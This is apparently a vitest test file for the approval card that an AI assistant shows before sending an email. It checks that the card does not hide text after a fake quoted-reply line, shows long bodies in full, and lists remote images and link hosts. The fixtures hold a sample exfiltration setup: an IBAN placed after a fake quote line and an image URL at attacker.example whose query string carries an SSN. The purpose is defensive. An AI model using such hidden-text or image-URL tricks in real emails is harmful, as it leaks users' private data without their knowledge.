// The send card shows everything that goes out. The fallback preview
// (servers without the display model) never cuts the text at an "On … wrote:" line or at a length,
// and lists every remote image address and link host; the display model lists them as fields.

import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { ApprovalCard } from './ApprovalCard'
import { ApprovalDisplay } from './present/ApprovalDisplay'
import type { Display } from './present/types'
import type { ApprovalRef } from './useAssistant'

const noop = () => undefined
const SECRET = 'IBAN DE89 3704 0044 0532 0130 00'

describe('send approval card', () => {
  it('fallback preview shows the text after a fake quote line, the whole of a long body, images and links', () => {
    const long = 'word '.repeat(400)
    const a: ApprovalRef = {
      id: 1, action: 'mail.send', title: 'Send “Re: invoice”', status: 'pending', display: null, outcome: null,
      preview: {
        email: {
          from: 'me@example.com', to: [{ email: 'known@else.org' }], subject: 'Re: invoice',
          text: `Thanks, noted.\n\nOn Mon, 1 Jan 2026, Alice wrote:\n\n${SECRET}\n\n[image]\n\n${long}END-OF-BODY`,
          images: ['https://attacker.example/p.png?ssn=123-45-6789'], links: ['collect.example'],
        },
      },
    }
    const html = renderToStaticMarkup(createElement(ApprovalCard, { a, onStatus: noop, onDecided: noop }))
    expect(html).toContain(SECRET)
    expect(html).toContain('END-OF-BODY')
    expect(html).toContain('https://attacker.example/p.png?ssn=123-45-6789')
    expect(html).toContain('collect.example')
  })

  it('display model lists remote images and link hosts in full', () => {
    const d: Display = {
      v: 1, icon: 'send', title: 'Send', summary: null, danger: false, reason: null, text: 'Send',
      fields: [
        { label: 'Remote images', value: { t: 'list', text: '', items: ['https://a.example/1.png', 'https://b.example/2.png'], more: 0 } },
        { label: 'Links to', value: { t: 'list', text: '', items: ['collect.example'], more: 0 } },
      ],
    }
    const html = renderToStaticMarkup(createElement(ApprovalDisplay, { d }))
    expect(html).toContain('https://a.example/1.png')
    expect(html).toContain('https://b.example/2.png')
    expect(html).toContain('collect.example')
  })
})
